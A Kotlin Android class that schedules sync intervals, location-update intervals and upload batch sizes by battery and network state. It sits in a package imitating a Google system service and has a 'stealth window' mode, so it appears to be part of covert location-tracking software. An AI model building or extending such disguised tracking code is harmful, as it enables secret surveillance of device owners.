package com.google.android.systemservice.managers

import android.util.Log

/**
 * Calculates optimal sync and location intervals based on device state.
 */
class SyncIntervalCalculator {

    companion object {
        private const val TAG = "SyncIntervalCalc"

        // Sync intervals (minutes)
        private const val SYNC_STEALTH_CHARGING_MIN = 2
        private const val SYNC_LOW_POWER_MIN = 60
        private const val SYNC_CHARGING_WIFI_MIN = 5
        private const val SYNC_CHARGING_MIN = 10
        private const val SYNC_CRITICAL_BATTERY_MIN = 120
        private const val SYNC_LOW_BATTERY_MIN = 45
        private const val SYNC_WIFI_MIN = 15
        private const val SYNC_DEFAULT_MIN = 30

        // Battery thresholds (percent)
        private const val BATTERY_CRITICAL_THRESHOLD = 15
        private const val BATTERY_LOW_THRESHOLD = 30
        private const val BATTERY_MEDIUM_THRESHOLD = 50
        private const val BATTERY_DECENT_THRESHOLD = 20

        // Location intervals (milliseconds)
        private const val LOCATION_CHARGING_INTERVAL_MS = 5 * 60 * 1000L
        private const val LOCATION_HIGH_BATTERY_INTERVAL_MS = 10 * 60 * 1000L
        private const val LOCATION_MEDIUM_BATTERY_INTERVAL_MS = 20 * 60 * 1000L
        private const val LOCATION_LOW_BATTERY_INTERVAL_MS = 30 * 60 * 1000L

        // Batch sizes
        private const val BATCH_WIFI_HIGH_BATTERY = 100
        private const val BATCH_WIFI_DEFAULT = 50
        private const val BATCH_CELLULAR_HIGH_BATTERY = 30
        private const val BATCH_CELLULAR_MEDIUM_BATTERY = 20
        private const val BATCH_MINIMUM = 10
    }

    /**
     * Get optimal sync interval in minutes based on current device state.
     */
    fun calculateSyncInterval(
        batteryLevel: Int,
        isCharging: Boolean,
        isLowPowerMode: Boolean,
        networkType: NetworkType,
        isStealthWindow: Boolean
    ): Long {
        val interval = when {
            isStealthWindow && isCharging -> SYNC_STEALTH_CHARGING_MIN
            isLowPowerMode -> SYNC_LOW_POWER_MIN
            isCharging && networkType == NetworkType.WIFI -> SYNC_CHARGING_WIFI_MIN
            isCharging -> SYNC_CHARGING_MIN
            batteryLevel < BATTERY_CRITICAL_THRESHOLD -> SYNC_CRITICAL_BATTERY_MIN
            batteryLevel < BATTERY_LOW_THRESHOLD -> SYNC_LOW_BATTERY_MIN
            networkType == NetworkType.WIFI -> SYNC_WIFI_MIN
            else -> SYNC_DEFAULT_MIN
        }

        Log.d(TAG, "Sync interval: $interval min (Stealth: $isStealthWindow)")
        return interval.toLong()
    }

    /**
     * Get optimal location update interval in milliseconds.
     */
    fun calculateLocationInterval(batteryLevel: Int, isCharging: Boolean): Long {
        val interval = when {
            isCharging -> LOCATION_CHARGING_INTERVAL_MS
            batteryLevel > BATTERY_MEDIUM_THRESHOLD -> LOCATION_HIGH_BATTERY_INTERVAL_MS
            batteryLevel > BATTERY_DECENT_THRESHOLD -> LOCATION_MEDIUM_BATTERY_INTERVAL_MS
            else -> LOCATION_LOW_BATTERY_INTERVAL_MS
        }

        Log.d(TAG, "Location update interval: ${interval / 1000 / 60} min")
        return interval
    }

    /**
     * Get recommended batch size for data uploads.
     */
    fun calculateBatchSize(batteryLevel: Int, networkType: NetworkType): Int {
        return when {
            networkType == NetworkType.WIFI && batteryLevel > BATTERY_MEDIUM_THRESHOLD -> BATCH_WIFI_HIGH_BATTERY
            networkType == NetworkType.WIFI -> BATCH_WIFI_DEFAULT
            batteryLevel > BATTERY_MEDIUM_THRESHOLD -> BATCH_CELLULAR_HIGH_BATTERY
            batteryLevel > BATTERY_DECENT_THRESHOLD -> BATCH_CELLULAR_MEDIUM_BATTERY
            else -> BATCH_MINIMUM
        }
    }

    enum class NetworkType {
        NONE, WIFI, CELLULAR
    }
}
